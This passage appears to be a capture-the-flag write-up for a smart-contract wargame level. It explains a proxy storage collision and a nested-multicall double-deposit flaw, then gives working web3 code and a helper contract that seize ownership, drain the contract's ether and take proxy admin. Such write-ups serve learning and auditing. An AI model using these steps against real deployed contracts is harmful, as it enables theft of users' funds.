the proxy storage is overlapped with the implementation storage, meaning `pendingAdmin` is `owner` and `admin` is `maxBalance`. First we need to call `proposeNewAdmin` with our address, this will make us the owner. Once we are the owner of the contract, we can whitelist ourselves to call the whitelisted functions. Now, we will need to modify `maxBalance` so we can set our address there and that would make us the admin of the proxy. To achieve this, we need to extract all the ether from the contract, the initial state has some ether from the original owner that we can't directly extract. The `multicall` function prevents from calling multiple times the `deposit` function, but what we can do is call `multicall` again and pass it a second call to `deposit`, effectively adding twice the value to the balance of the player. From here, we can call `execute` extracting the total value held in the contract and lastly, once the contract is emptied, call `setMaxBalance` with our address to make us the admin of the proxy.

```
const dataProposeAdmin = web3.eth.abi.encodeFunctionCall({
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [{
			"name": "_newAdmin",
			"type": "address"
    }]
}, [player]);

await contract.sendTransaction({ data: dataProposeAdmin });

await contract.addToWhitelist(player);

const dataDeposit = web3.eth.abi.encodeFunctionCall({
    name: 'deposit',
    type: 'function',
    inputs: []
}, []);

const dataMulticall = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{
        type: 'bytes[]',
        name: 'data',
    }]
}, [[dataDeposit]]);

await contract.multicall([dataDeposit, dataMulticall], { value: toWei('1') });

await contract.execute('<withdraw contract address>', toWei('2'), '0x');

await contract.setMaxBalance(web3.utils.toBN(player));
```

```
contract Withdraw {
    address payable owner;

    constructor() public {
        owner = msg.sender;
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
```
